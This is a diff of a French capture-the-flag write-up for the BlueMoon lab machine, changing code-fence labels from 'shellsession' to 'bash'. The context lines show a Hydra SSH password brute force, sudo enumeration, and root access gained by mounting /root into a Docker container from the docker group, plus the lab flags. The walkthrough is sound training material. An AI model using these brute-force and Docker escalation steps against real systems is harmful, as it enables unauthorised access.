@@ -60,7 +60,7 @@ Le second est une liste de 32 mots de passe où des lettres ont été remplacée
 
 Une tentative de bruteforce sur le FTP échoue mais ça passe avec le SSH :
 
-```shellsession
+```bash
 $ ./hydra -l robin -P /tmp/p_lists.txt ssh://192.168.56.40
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -76,7 +76,7 @@ On peut alors obtenir le flag `Fl4g{u5er1r34ch3d5ucc355fully}`
 
 Premier réflexe une fois connecté, voir si l'utilisateur peut exécuter une commande via sudo :
 
-```shellsession
+```bash
 robin@BlueMoon:~$ sudo -l
 Matching Defaults entries for robin on bluemoon:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -130,7 +130,7 @@ On a alors accès au second flag : *Fl4g{Y0ur34ch3du53r25uc355ful1y}*
 
 On ne peux pas utiliser sudo car on ne dispose pas du mot de passe de *jerry* mais je note que l'utilisateur fait partie du groupe docker et qu'une image est présente sur le système :
 
-```shellsession
+```bash
 jerry@BlueMoon:~$ id
 uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
 jerry@BlueMoon:~$ docker images -a
@@ -140,7 +140,7 @@ alpine              latest              28f6e2705743        20 months ago       
 
 Il suffit alors de lancer cette image en montant le répertoire de root à un emplacement spécifique dans le container. On aura alors accès à son contenu :
 
-```shellsession
+```bash
 jerry@BlueMoon:~$ docker run -it -v /root:/real_root alpine
 / # cd real_root
 /real_root # ls
